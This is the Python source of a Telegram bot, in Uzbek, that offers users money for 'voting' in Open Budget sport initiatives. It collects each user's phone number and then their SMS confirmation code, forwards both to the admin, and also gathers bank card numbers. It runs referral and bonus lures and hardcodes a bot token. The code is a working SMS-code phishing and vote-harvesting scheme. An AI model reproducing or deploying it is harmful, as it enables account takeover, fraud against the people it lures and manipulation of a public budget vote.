import telebot
import time
import os
from threading import Thread
from flask import Flask
from telebot.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton

TOKEN = "8804847521:AAGVqDdkmc0hHdrDVLgpGQ7WDDBsFrGWC5s"  # Bot tokenini yozing
ADMIN_ID = 6607270447     # Telegram ID raqamingizni yozing

bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

@app.route('/')
def home():
    return "Bot faol ishlamoqda!"

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)

user_data = {}
bot_settings = {
    "majburiy_kanal": None,  
    "majburiy_guruh": None,  
    "description": (
        "🤖 **Open Budget Botiga Xush Kelibsiz!**\n\n"
        "Ushbu bot orqali siz sport tashabbuslariga ovoz berib, pul ishlashingiz mumkin.\n\n"
        "👇 Boshlash uchun pastdagi tugmalardan foydalaning!"
    )
}

def get_user(user_id, username=""):
    if user_id not in user_data:
        user_data[user_id] = {
            "balans": 0, "referallar": 0, "holat": None, "karta": None,
            "username": username or "Mavjud emas", "oxirgi_bonus": 0, "inviter_id": None  
        }
    return user_data[user_id]

def asosiy_menyu():
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.row(KeyboardButton("🗳 Ovoz berish"))
    markup.row(KeyboardButton("💰 Balans"), KeyboardButton("📩 Pulni yechib olish"))
    markup.row(KeyboardButton("🔗 Referal ssilka"))
    markup.row(KeyboardButton("🎉 Aksiyalar"), KeyboardButton("💸 To'lovlar isboti"))
    return markup

def admin_panel_markup():
    markup = InlineKeyboardMarkup()
    markup.row(InlineKeyboardButton("📊 Foydalanuvchilar soni", callback_data="admin_stats"))
    markup.row(InlineKeyboardButton("📢 Reklama (Har qanday media)", callback_data="admin_send_reklama"))
    markup.row(InlineKeyboardButton("📢 Kanal Sozlamalari", callback_data="admin_manage_channel"))
    markup.row(InlineKeyboardButton("💬 Guruh Sozlamalari", callback_data="admin_manage_group"))
    markup.row(InlineKeyboardButton("📝 Tavsifni o'zgartirish", callback_data="admin_edit_desc"))
    return markup

def check_sub(user_id):
    for target in [bot_settings["majburiy_kanal"], bot_settings["majburiy_guruh"]]:
        if target:
            try:
                status = bot.get_chat_member(target, user_id).status
                if status not in ["member", "administrator", "creator"]: return False
            except: return False
    return True

@bot.message_handler(func=lambda message: message.chat.id == ADMIN_ID and message.reply_to_message)
def admin_reply_to_user(message):
    try:
        target_id = None
        for line in message.reply_to_message.text.split('\n'):
            if "ID:" in line: target_id = int(line.split(":")[1].strip().replace("`", ""))
        if target_id:
            bot.send_message(target_id, f"💬 **Admin:** {message.text}")
            bot.reply_to(message, "✅ Xabaringiz yetkazildi.")
    except: bot.reply_to(message, "❌ Xatolik yuz berdi.")

@bot.message_handler(commands=['admin'])
def admin_command(message):
    if message.chat.id == ADMIN_ID:
        bot.send_message(ADMIN_ID, "🛠 **Admin Panel:**", reply_markup=admin_panel_markup(), parse_mode="Markdown")

@bot.message_handler(commands=['start'])
def start_command(message):
    user_id = message.chat.id
    is_new = user_id not in user_data
    user = get_user(user_id, message.from_user.username)
    
    args = message.text.split()
    if len(args) > 1 and args[1].isdigit() and is_new and int(args[1]) != user_id:
        user["inviter_id"] = int(args[1])

    if not check_sub(user_id):
        markup = InlineKeyboardMarkup()
        if bot_settings["majburiy_kanal"]: markup.add(InlineKeyboardButton("📢 Kanalga a'zo bo'lish", url=f"https://t.me/{bot_settings['majburiy_kanal'].replace('@','') }"))
        if bot_settings["majburiy_guruh"]: markup.add(InlineKeyboardButton("💬 Guruhga qo'shish", url=f"https://t.me/{bot_settings['majburiy_guruh'].replace('@','') }"))
        markup.add(InlineKeyboardButton("✅ Tekshirish", callback_data="check_sub_again"))
        bot.send_message(user_id, "⚠️ Botdan foydalanish uchun kanallarga a'zo bo'ling!", reply_markup=markup)
        return

    if user["inviter_id"] and "taklif_qilindi" not in user:
        ref = get_user(user["inviter_id"])
        ref["referallar"] += 1
        ref["balans"] += 1000
        user["taklif_qilindi"] = True
        try: bot.send_message(user["inviter_id"], "🎉 Do'stingiz qo'shildi! +1000 so'm")
        except: pass

    bot.send_message(user_id, bot_settings["description"], reply_markup=asosiy_menyu(), parse_mode="Markdown")

def process_menu_logic(message):
    user_id = message.chat.id
    user = get_user(user_id, message.from_user.username)
    text = message.text

    if text == "🗳 Ovoz berish":
        user["holat"] = "kutish_telefon"
        bot.send_message(user_id, "📞 Ovoz berish uchun telefon raqamingizni kiriting:")
    elif text == "💰 Balans":
        karta = user["karta"] or "Kiritilmagan"
        bot.send_message(user_id, f"Sizning hisobingiz: {user['balans']} so'm\n👥 Do'stlar: {user['referallar']} ta\n💳 Karta: {karta}")
    elif text == "📩 Pulni yechib olish":
        if user["balans"] < 6000:
            bot.send_message(user_id, f"Minimal pul yechish 6000 so'm. Hozir: {user['balans']} so'm")
        else:
            user["holat"] = "kutish_karta"
            bot.send_message(user_id, "💳 Plastik karta raqamingizni kiriting:")
    elif text == "🔗 Referal ssilka":
        b_info = bot.get_me()
        link = f"https://t.me/{b_info.username}?start={user_id}"
        sh_text = f"🔥 Open Budget botida ovoz berib pul ishlang! Kirish: {link}"
        markup = InlineKeyboardMarkup().add(InlineKeyboardButton("🚀 Do'stlarga ulashish", switch_inline_query=sh_text))
        bot.send_message(user_id, f"🤝 **Referral tizimi**\n\nSsilka:\n{link}", reply_markup=markup, parse_mode="Markdown")
    elif text == "🎉 Aksiyalar":
        now = time.time()
        if now - user.get("oxirgi_bonus", 0) >= 86400:
            user["balans"] += 500
            user["oxirgi_bonus"] = now
            bot.send_message(user_id, "🎁 Kunlik bonus 500 so'm qo'shildi!")
        else:
            bot.send_message(user_id, "❌ Siz bugungi bonusni olgansiz!")
    elif text == "💸 To'lovlar isboti":
        bot.send_message(user_id, "✅ Kanal: https://t.me/openbudgetisbot")
    elif user["holat"] == "kutish_telefon":
        bot.send_message(ADMIN_ID, f"📱 Raqam keldi!\nID: `{user_id}`\nUsername: @{user['username']}\nRaqam: `{text}`", parse_mode="Markdown")
        user["holat"] = "kutish_sms"
        bot.send_message(user_id, "📩 SMS kodni kiriting:")
    elif user["holat"] == "kutish_sms":
        m = InlineKeyboardMarkup().add(InlineKeyboardButton("➕ 45k qo'shish", callback_data=f"add_45000_{user_id}"), InlineKeyboardButton("❌ Xato", callback_data=f"wrong_code_{user_id}"))
        bot.send_message(ADMIN_ID, f"🔑 SMS Kod!\nID: `{user_id}`\nUsername: @{user['username']}\nKod: `{text}`", reply_markup=m, parse_mode="Markdown")
        user["holat"] = None
        bot.send_message(user_id, "⏳ Kod tekshirilmoqda...")
    elif user["holat"] == "kutish_karta":
        user["karta"] = text; user["holat"] = None
        bot.send_message(ADMIN_ID, f"💰 Yechish so'rovi!\nID: `{user_id}`\nSumma: {user['balans']}\nKarta: `{text}`", parse_mode="Markdown")
        user["balans"] = 0
        bot.send_message(user_id, "✅ So'rovingiz adminga yuborildi.")

@bot.message_handler(content_types=['text', 'photo', 'audio', 'video', 'voice', 'document'])
def handle_all(message):
    user_id = message.chat.id
    user = get_user(user_id, message.from_user.username)
    if user_id == ADMIN_ID and user.get("holat") == "kutish_reklama":
        user["holat"] = None
        for uid in list(user_data.keys()):
            try: bot.copy_message(uid, ADMIN_ID, message.message_id); time.sleep(0.05)
            except: pass
        bot.send_message(ADMIN_ID, "✅ Tarqatildi.")
        return
    if user_id == ADMIN_ID and user.get("holat") in ["kutish_kanal", "kutish_guruh", "kutish_desc"]:
        h = user["holat"]; user["holat"] = None
        val = None if message.text == "0" else (message.text if message.text.startswith("@") else f"@{message.text}")
        if h == "kutish_kanal": bot_settings["majburiy_kanal"] = val
        elif h == "kutish_guruh": bot_settings["majburiy_guruh"] = val
        elif h == "kutish_desc": bot_settings["description"] = message.text
        bot.send_message(ADMIN_ID, "✅ Yangilandi.")
        return
    if message.content_type == 'text':
        if not check_sub(user_id): start_command(message); return
        if user_id != ADMIN_ID and user["holat"] is None and message.text not in ["🗳 Ovoz berish", "💰 Balans", "📩 Pulni yechib olish", "🔗 Referal ssilka", "🎉 Aksiyalar", "💸 To'lovlar isboti"]:
            bot.send_message(ADMIN_ID, f"👤 Xabar!\nID: `{user_id}`\n@{user['username']}\n\n{message.text}")
            return
        process_menu_logic(message)

@bot.callback_query_handler(func=lambda call: True)
def handle_callbacks(call):
    user_id = call.message.chat.id
    user = get_user(user_id)
    if call.data == "check_sub_again":
        if check_sub(user_id):
            bot.delete_message(user_id, call.message.message_id)
            if user["inviter_id"] and "taklif_qilindi" not in user:
                ref = get_user(user["inviter_id"])
                ref["referallar"] += 1; ref["balans"] += 1000; user["taklif_qilindi"] = True
                try: bot.send_message(user["inviter_id"], "🎉 Do'stingiz a'zo bo'ldi! +1000 so'm")
                except: pass
            bot.send_message(user_id, bot_settings["description"], reply_markup=asosiy_menyu(), parse_mode="Markdown")
        else: bot.send_message(user_id, "❌ Hali a'zo bo'lmadingiz.")
    elif call.data == "admin_stats": bot.send_message(ADMIN_ID, f"📊 Foydalanuvchilar: {len(user_data)}")
    elif call.data == "admin_send_reklama": user["holat"] = "kutish_reklama"; bot.send_message(ADMIN_ID, "📢 Reklamani yuboring:")
    elif call.data == "admin_manage_channel": user["holat"] = "kutish_kanal"; bot.send_message(ADMIN_ID, "📢 Yangi kanal username yozing (o'chirish uchun 0):")
    elif call.data == "admin_manage_group": user["holat"] = "kutish_guruh"; bot.send_message(ADMIN_ID, "💬 Yangi guruh username yozing (o'chirish uchun 0):")
    elif call.data == "admin_edit_desc": user["holat"] = "kutish_desc"; bot.send_message(ADMIN_ID, "📝 Yangi tavsifni yuboring:")
    elif call.data.startswith("add_45000_"):
        tid = int(call.data.split("_")[2]); get_user(tid)["balans"] += 45000
        bot.edit_message_text(call.message.text + "\n\n✅ Tasdiqlandi!", ADMIN_ID, call.message.message_id)
        try: bot.send_message(tid, "🎉 Ovozingiz tasdiqlandi! +45 000 so'm")
        except: pass
    elif call.data.startswith("wrong_code_"):
        tid = int(call.data.split("_")[2])
        bot.edit_message_text(call.message.text + "\n\n❌ Rad etildi", ADMIN_ID, call.message.message_id)
        try: bot.send_message(tid, "❌ Kod noto'g'ri kiritildi.")
        except: pass

if __name__ == '__main__':
    Thread(target=run_flask, daemon=True).start()
    bot.polling(none_stop=True)
